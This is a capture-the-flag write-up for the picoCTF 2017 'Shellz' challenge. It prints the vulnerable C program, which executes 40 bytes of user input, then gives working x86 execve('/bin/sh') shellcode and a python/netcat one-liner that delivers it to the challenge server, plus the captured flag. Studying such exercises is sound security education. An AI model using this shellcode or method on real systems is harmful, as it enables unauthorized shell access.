# Shellz

```
You no longer have an easy thing to call, but you have more space.
Program: shellz! Source. Connect on shell2017.picoctf.com:34621.
```

Binary: https://webshell2017.picoctf.com/static/01d67358f5a3f31253a7721d01865f0e/shellz

Source: https://webshell2017.picoctf.com/static/01d67358f5a3f31253a7721d01865f0e/shellz.c

## Solution

The problem hints at [Shellcode] (http://shell-storm.org/shellcode/).

On performing netcat, we get this message:

```
My mother told me to never accept things from strangers
How bad could running a couple bytes be though?
Give me 40 bytes:
```

The source code provided is:

```cpp
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mman.h>

#define AMOUNT_OF_STUFF 40

//Learned my lesson! No more easy flags
/*void win(){
    system("/bin/cat ./flag.txt");
}*/


void vuln(){
    char * stuff = (char *)mmap(NULL, AMOUNT_OF_STUFF, PROT_EXEC|PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, 0, 0);
    if(stuff == MAP_FAILED){
        printf("Failed to get space. Please talk to admin\n");
        exit(0);
    }
    printf("Give me %d bytes:\n", AMOUNT_OF_STUFF);
    fflush(stdout);
    int len = read(STDIN_FILENO, stuff, AMOUNT_OF_STUFF);
    if(len == 0){
        printf("You didn't give me anything :(");
        exit(0);
    }
    void (*func)() = (void (*)())stuff;
    func();
}

int main(int argc, char*argv[]){
    printf("My mother told me to never accept things from strangers\n");
    printf("How bad could running a couple bytes be though?\n");
    fflush(stdout);
    vuln();
    return 0;
}
```

The comments in the code tell us that the flag is present on the server
and we just need to run `cat` on it.

So, how do we get access to the shell?

From the source code, this line is very important for us:

`void (*func)() = (void (*)())stuff;`

A function pointer is created to the input bytes that we'll provide to the program.

If we write assembly code that can provide us shell access, and fit that code
within 40 bytes, maybe we'll be able to get shell access.

Check [this](http://shell-storm.org/shellcode/files/shellcode-841.php) out to see how we can
generate shell code to get access to the server shell.

The HEX code that we need to pass is:

```
"\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f"
"\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd"
"\x80"
```

However, we need to keep the shell open for access so that we can `cat` our flag.

Hence, we can use `cat -` to keep the shell open.

```bash
(python -c 'print "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"'; cat -) | nc shell2017.picoctf.com 34621
```

```bash
My mother told me to never accept things from strangers
How bad could running a couple bytes be though?
Give me 40 bytes:
/bin/cat ./flag.txt
f6f01bf0649b5aa5ec299bb51c8f8db4
```

The flag we get is: `f6f01bf0649b5aa5ec299bb51c8f8db4`
